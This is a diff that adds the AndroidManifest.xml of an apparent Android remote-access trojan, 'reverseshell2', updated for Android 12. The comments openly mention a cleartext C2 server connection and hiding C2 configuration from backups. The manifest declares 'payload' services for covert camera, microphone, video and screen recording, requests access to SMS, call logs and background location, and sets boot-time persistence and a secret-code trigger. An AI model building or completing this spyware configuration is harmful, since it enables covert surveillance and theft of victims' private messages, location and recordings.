@@ -1,0 +1,223 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!--
+    AndroidManifest.xml, updated for Android 12 (API 31).
+
+    CRITICAL CHANGES FOR ANDROID 12:
+     1. All <activity>, <service>, <receiver> with intent filters MUST have
+        android:exported explicitly set. Without it, the build fails on
+        targetSdkVersion 31+.
+
+     2. FOREGROUND SERVICE TYPE - Android 11+ (API 30+) requires every
+        foreground service to declare android:foregroundServiceType in the
+        manifest. On Android 12 the system enforces this - without it, the
+        service crashes when calling startForeground().
+
+     3. FOREGROUND_SERVICE permission - Android 9+ (API 28+) requires
+        <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+        to start any foreground service.
+
+     4. POST_NOTIFICATIONS - Android 13+ (API 33+) requires runtime permission
+        to show the foreground-service notification. Included for forward
+        compatibility.
+
+     5. ACCESS_BACKGROUND_LOCATION - Android 10+ (API 29+) requires this
+        permission for background location access. On Android 12 it must be
+        requested separately after foreground location is granted.
+
+     6. Scoped storage - READ_EXTERNAL_STORAGE / WRITE_EXTERNAL_STORAGE are
+        deprecated on API 29+ and ignored on API 31+. Marked with
+        maxSdkVersion to prevent install-time rejection.
+
+     7. android:usesCleartextTraffic="true" - Required for plain TCP socket
+        connections (C2 server) over non-TLS.
+
+     8. android:allowBackup="false" - Prevents the app's data from being
+        backed up to Google Drive (C2 credentials, IP, config).
+
+     9. Camera + autofocus features marked android:required="false" so the
+        app installs on devices without a camera.
+
+    10. All foreground-service payload services (CameraService, audioManager,
+        videoRecorder, screenRecorder) declared with their specific
+        foregroundServiceType attributes.
+
+    Place at: app/src/main/AndroidManifest.xml
+-->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.example.reverseshell2">
+
+    <!-- ============================================================
+         PERMISSIONS - Android 12 requirements
+         ============================================================ -->
+
+    <!-- Network / C2 connection -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <!-- Foreground service (CRITICAL for Android 12) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <!-- Android 14+ (API 34): type-specific FGS permissions (safe to include) -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CONNECTED_DEVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
+
+    <!-- Notifications (Android 13+ runtime permission for foreground service notification) -->
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <!-- Camera -->
+    <uses-permission android:name="android.permission.CAMERA" />
+
+    <!-- Microphone -->
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION" />
+
+    <!-- Storage (scoped storage - deprecated on API 29+, ignored on API 31+) -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"
+        android:maxSdkVersion="28" />
+
+    <!-- Telephony / SIM -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
+
+    <!-- SMS / Call logs -->
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <!-- Device administration / other -->
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- ============================================================
+         FEATURES - required=false allows install on camera-less devices
+         ============================================================ -->
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.front" android:required="false" />
+
+    <!-- ============================================================
+         APPLICATION
+         ============================================================ -->
+    <application
+        android:allowBackup="false"
+        android:hardwareAccelerated="false"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:largeHeap="true"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme"
+        android:usesCleartextTraffic="true"
+        tools:targetApi="31">
+
+        <!-- ============================================================
+             ACTIVITIES
+             ============================================================ -->
+
+        <!-- Launcher activity -->
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- Control panel -->
+        <activity
+            android:name=".controlPanel"
+            android:exported="false" />
+
+        <!-- Screen recording consent activity (transparent) -->
+        <activity
+            android:name=".Payloads.ScreenRecordActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- ============================================================
+             FOREGROUND SERVICES - ALL declared with foregroundServiceType
+             (REQUIRED on Android 11+ / enforced on Android 12)
+             ============================================================ -->
+
+        <!-- Main C2 service - runs in foreground to keep connection alive -->
+        <service
+            android:name=".mainService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="connectedDevice" />
+
+        <!-- Camera payload foreground service -->
+        <service
+            android:name=".Payloads.CameraService"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="camera" />
+
+        <!-- Microphone payload foreground service -->
+        <service
+            android:name=".Payloads.audioManager"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="microphone" />
+
+        <!-- Video recorder foreground service (camera + microphone) -->
+        <service
+            android:name=".Payloads.videoRecorder"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="camera|microphone" />
+
+        <!-- Screen recorder foreground service -->
+        <service
+            android:name=".Payloads.screenRecorder"
+            android:enabled="true"
+            android:exported="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <!-- JobScheduler service (not a foreground service, but requires BIND_JOB_SERVICE) -->
+        <service
+            android:name=".jobScheduler"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="false" />
+
+        <!-- ============================================================
+             RECEIVERS
+             ============================================================ -->
+
+        <!-- Boot / autostart receiver -->
+        <receiver
+            android:name=".broadcastReciever"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.SCREEN_OFF" />
+                <action android:name="android.intent.action.SCREEN_ON" />
+            </intent-filter>
+        </receiver>
+
+        <!-- Secret code receiver (keypad listener) -->
+        <receiver
+            android:name=".keypadListner"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+                <data android:scheme="android_secret_code" android:host="1337" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+
+</manifest>
